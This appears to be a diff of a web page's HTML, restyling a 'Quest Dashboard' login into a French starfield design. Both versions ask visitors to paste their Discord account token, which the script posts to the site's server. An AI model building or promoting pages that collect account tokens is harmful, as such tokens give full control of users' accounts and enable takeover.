@@ -1,54 +1,137 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Login</title>
-    <link rel="stylesheet" href="/style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Obistral</title>
+  <link rel="stylesheet" href="/style.css">
 </head>
-<body class="login-page">
-    <div class="login-box">
-        <h1 class="login-title">Quest Dashboard</h1>
-        <p class="login-sub">Login with your Discord token</p>
 
-        <form id="loginForm">
-            <input type="password" id="tokenInput" placeholder="Paste your token here..." required autocomplete="off">
-            <button type="submit">Login</button>
-            <div id="loginError" class="login-error"></div>
-        </form>
+<body>
 
-        <p class="login-foot">Check the Discord channel for how to get your token</p>
-    </div>
+  <!-- Fond étoilé -->
+  <div class="starfield"></div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const token = document.getElementById('tokenInput').value.trim();
-            const btn = e.target.querySelector('button');
-            const err = document.getElementById('loginError');
-            btn.disabled = true;
-            btn.textContent = 'Connecting...';
-            err.textContent = '';
-            try {
-                const res = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token })
-                });
-                const data = await res.json();
-                if (data.success) {
-                    window.location.href = data.redirect || '/dashboard';
-                } else {
-                    err.textContent = data.error || 'Invalid token';
-                    btn.disabled = false;
-                    btn.textContent = 'Login';
-                }
-            } catch {
-                err.textContent = 'Network error';
-                btn.disabled = false;
-                btn.textContent = 'Login';
-            }
-        });
-    </script>
+  <main class="dashboard">
+
+    <!-- Logo Discord -->
+    <a href="https://discord.gg/kDbevkbHvX" target="_blank" class="discord-logo">
+      Discord
+    </a>
+
+    <!-- LA CARTE EST L'ORBE -->
+    <section class="cookie-orb-card">
+
+      <!-- Glow extérieur -->
+      <div class="orb-aura"></div>
+
+      <!-- Particules -->
+      <span class="particle p1"></span>
+      <span class="particle p2"></span>
+      <span class="particle p3"></span>
+      <span class="particle p4"></span>
+      <span class="particle p5"></span>
+
+      <!-- Orbe -->
+      <div class="orb">
+
+        <!-- Reflets / facettes -->
+        <div class="facet facet-1"></div>
+        <div class="facet facet-2"></div>
+        <div class="facet facet-3"></div>
+        <div class="facet facet-4"></div>
+        <div class="facet facet-5"></div>
+        <div class="facet facet-6"></div>
+        <div class="facet facet-7"></div>
+
+        <!-- Lumière interne -->
+        <div class="orb-light"></div>
+
+        <!-- Zone de texte -->
+        <input
+          type="password"
+          class="cookie-input"
+          placeholder="Token Discord"
+          id="tokenInput"
+          autocomplete="off"
+          spellcheck="false"
+        >
+
+        <!-- Étoile -->
+        <div class="orb-star">★</div>
+
+        <!-- Reflet -->
+        <div class="orb-shine"></div>
+
+      </div>
+
+    </section>
+
+  </main>
+
+  <script>
+    // Générer beaucoup plus d'étoiles de fond
+    const starfield = document.querySelector('.starfield');
+    for (let i = 0; i < 300; i++) {
+      const star = document.createElement('div');
+      star.className = 'star';
+      star.style.left = Math.random() * 100 + '%';
+      star.style.top = Math.random() * 100 + '%';
+      star.style.animationDelay = Math.random() * 5 + 's';
+      star.style.animationDuration = (Math.random() * 3 + 2) + 's';
+      star.style.width = (Math.random() * 2 + 1) + 'px';
+      star.style.height = star.style.width;
+      starfield.appendChild(star);
+    }
+
+    // Login direct dans l'orbe
+    const tokenInput = document.getElementById('tokenInput');
+    const loginError = document.createElement('div');
+    loginError.className = 'login-error';
+    loginError.style.cssText = 'position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); color: #ff709b; font-size: 14px; text-align: center; z-index: 100;';
+    document.body.appendChild(loginError);
+
+    // Masquer le placeholder quand on tape
+    tokenInput.addEventListener('input', () => {
+      if (tokenInput.value.length > 0) {
+        tokenInput.style.color = 'white';
+      } else {
+        tokenInput.style.color = 'rgba(255, 255, 255, 0.5)';
+      }
+    });
+
+    tokenInput.addEventListener('keydown', async (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        const token = tokenInput.value.trim();
+        if (!token) return;
+
+        tokenInput.style.opacity = '0.5';
+        tokenInput.disabled = true;
+        loginError.textContent = '';
+
+        try {
+          const res = await fetch('/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token })
+          });
+          const data = await res.json();
+          if (data.success) {
+            window.location.href = data.redirect || '/dashboard';
+          } else {
+            loginError.textContent = data.error || 'Token invalide';
+            tokenInput.style.opacity = '1';
+            tokenInput.disabled = false;
+          }
+        } catch {
+          loginError.textContent = 'Erreur réseau';
+          tokenInput.style.opacity = '1';
+          tokenInput.disabled = false;
+        }
+      }
+    });
+  </script>
+
 </body>
 </html>
